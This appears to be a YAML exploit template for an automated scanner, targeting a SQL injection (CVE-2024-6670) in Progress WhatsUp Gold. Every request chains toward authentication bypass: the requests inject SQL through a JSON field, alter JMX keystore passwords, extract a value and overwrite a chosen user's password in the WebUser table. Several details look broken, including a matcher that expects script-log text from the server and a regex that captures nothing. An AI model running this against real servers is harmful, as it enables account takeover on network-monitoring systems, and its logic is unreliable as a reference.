id: cve-2024-6670-sqli-auth-bypass

info:
  name: Progress Software WhatsUp Gold HasErrors SQL Injection Authentication Bypass (CVE-2024-6670)
  author: 3p1c0w3nd
  severity: high
  description: |
    Exploits an SQL Injection vulnerability in Progress Software WhatsUp Gold allowing for authentication bypass and password change.
    The vulnerability is present in the `/NmConsole/Platform/PerformanceMonitorErrors/HasErrors` endpoint.
  reference:
    - https://summoning.team/blog/progress-whatsup-gold-sqli-cve-2024-6670/
  tags: sqli, authentication-bypass

requests:
  - method: POST
    path:
      - "{{BaseURL}}/NmConsole/Platform/PerformanceMonitorErrors/HasErrors"
    headers:
      Content-Type: application/json
    body: |
      {
        "deviceId": "22222",
        "classId": "DF215E10-8BD4-4401-B2DC-99BB03135F2E';{{SQLPayload}};--",
        "range": "1",
        "n": "1",
        "start": "3",
        "end": "4",
        "businesdsHoursId": "5"
      }
    matchers:
      - type: word
        words:
          - "psyduck"
        part: body
        condition: contains

  - method: POST
    path:
      - "{{BaseURL}}/NmConsole/WugSystemAppSettings/JMXSecurity"
    headers:
      Content-Type: application/json
    body: |
      {
        "KeyStorePassword": "{{NewPassword}}",
        "TrustStorePassword": "{{NewPassword}}"
      }
    matchers:
      - type: word
        words:
          - "Used remote primitive to encrypt our passowrd"
        part: body
        condition: contains

  - method: GET
    path:
      - "{{BaseURL}}/NmConsole/Platform/Filter/AlertCenterItemsReportThresholds"
    matchers:
      - type: word
        words:
          - "psyduck"
        part: body
        condition: contains
    extractors:
      - type: regex
        name: encrypted_password
        group: 1
        regex: 'psyduck(.*?)'

  - method: POST
    path:
      - "{{BaseURL}}/NmConsole/Platform/PerformanceMonitorErrors/HasErrors"
    headers:
      Content-Type: application/json
    body: |
      {
        "deviceId": "22222",
        "classId": "UPDATE WebUser SET sPassword = {{EncryptedPassword}} where sUserName = '{{TargetUser}}';--",
        "range": "1",
        "n": "1",
        "start": "3",
        "end": "4",
        "businesdsHoursId": "5"
      }
    matchers:
      - type: word
        words:
          - "success"
        part: body
        condition: contains
